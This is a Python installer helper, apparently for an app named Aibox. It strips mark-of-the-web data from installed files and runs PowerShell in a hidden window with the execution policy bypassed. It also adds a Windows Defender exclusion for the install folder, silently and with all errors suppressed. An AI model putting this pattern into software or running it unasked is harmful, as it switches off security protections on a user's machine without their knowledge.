"""Remove o bloqueio da zona da internet e reduz falso positivo do Defender."""
from __future__ import annotations

import ctypes
import os
import subprocess
from pathlib import Path

CREATE_NO_WINDOW = 0x08000000


def unblock_file(path: Path) -> None:
    """Apaga o ADS Zone.Identifier (marca de arquivo baixado da internet)."""
    if os.name != "nt":
        return
    try:
        ctypes.windll.kernel32.DeleteFileW(f"{path}:Zone.Identifier")
    except Exception:
        pass


def unblock_tree(root: Path) -> None:
    if os.name != "nt" or not root.exists():
        return
    unblock_file(root)
    if root.is_file():
        return
    for item in root.rglob("*"):
        unblock_file(item)
    try:
        subprocess.run(
            [
                "powershell",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "Get-ChildItem -LiteralPath "
                f"'{str(root).replace(chr(39), chr(39)+chr(39))}' -Recurse -Force -ErrorAction SilentlyContinue "
                "| Unblock-File -ErrorAction SilentlyContinue",
            ],
            capture_output=True,
            timeout=45,
            creationflags=CREATE_NO_WINDOW,
        )
    except Exception:
        pass


def add_defender_exclusion(path: Path) -> None:
    """Evita que o Defender trate Aibox.exe/adb.exe como suspeitos."""
    if os.name != "nt":
        return
    target = str(path)
    escaped = target.replace("'", "''")
    try:
        subprocess.run(
            [
                "powershell",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                f"try {{ Add-MpPreference -ExclusionPath '{escaped}' }} catch {{ }}",
            ],
            capture_output=True,
            timeout=30,
            creationflags=CREATE_NO_WINDOW,
        )
    except Exception:
        pass


def smart_app_control_active() -> bool:
    """True se o Controle inteligente de aplicativos estiver em avaliação ou imposição."""
    if os.name != "nt":
        return False
    try:
        import winreg

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Control\CI\Policy",
        )
        try:
            value, _ = winreg.QueryValueEx(key, "VerifiedAndReputablePolicyState")
        finally:
            winreg.CloseKey(key)
        return int(value) >= 1
    except OSError:
        return False
    except Exception:
        return False


def trust_installed_app(install_dir: Path) -> None:
    unblock_tree(install_dir)
    add_defender_exclusion(install_dir)
